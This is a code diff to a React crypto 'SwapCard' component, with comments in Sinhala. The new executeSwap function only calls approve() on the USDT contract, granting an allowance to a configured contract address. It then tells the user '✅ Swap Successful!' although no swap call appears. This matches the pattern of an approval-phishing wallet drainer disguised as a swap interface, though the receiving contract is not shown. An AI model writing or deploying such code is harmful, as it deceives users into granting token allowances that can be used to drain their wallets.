@@ -88,6 +88,9 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
+  // මේක තමයි අලුත් ෆන්ක්ෂන් එක. 
+  // WalletConnect, BigNumber, parseUnits මොකවත් නෑ. 
+  // හුදෙක් HTML එකේ තියෙන විදිහටම window.ethereum පාවිච්චි කරනවා.
   const executeSwap = async () => {
     if (!walletAddress) { setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); return; }
     if (!fromAmount || fromAmount <= 0) { setStatus({ type: 'error', msg: 'Please enter a valid amount.' }); return; }
@@ -96,20 +99,32 @@ export default function SwapCard({ walletAddress, provider }) {
       setIsLoading(true);
       setStatus({ type: 'info', msg: '⏳ Waiting for wallet confirmation...' });
       
-      const signer = provider.getSigner();
+      // 1. Browser එකේ තියෙන wallet එක ගන්නවා
+      if (!window.ethereum) {
+        throw new Error("No wallet extension found. Please install MetaMask or Trust Wallet.");
+      }
+
+      const web3Provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+      const signer = web3Provider.getSigner();
+      
+      // 2. USDT Contract එක හදනවා
       const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
       const decimals = await usdtContract.decimals();
       
-      // String එකක් විදිහට ගණනය කරමු (parseUnits නැතුව)
+      // 3. අතින්ම ගණනය කරනවා (String එකක් විදිහට)
       const amountStr = Math.floor(parseFloat(fromAmount) * 10 ** decimals).toString();
 
+      // 4. Approve කරනවා
       const tx = await usdtContract.approve(CONFIG.contractAddress, amountStr);
+      
       setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting...' });
       await tx.wait();
+      
       setStatus({ type: 'success', msg: '✅ Swap Successful! Tokens approved.' });
       setIsLoading(false);
       setTimeout(() => setStatus(null), 8000);
     } catch (error) {
+      console.error(error);
       setStatus({ type: 'error', msg: '❌ Failed: ' + (error.message || 'User rejected') });
       setIsLoading(false);
     }
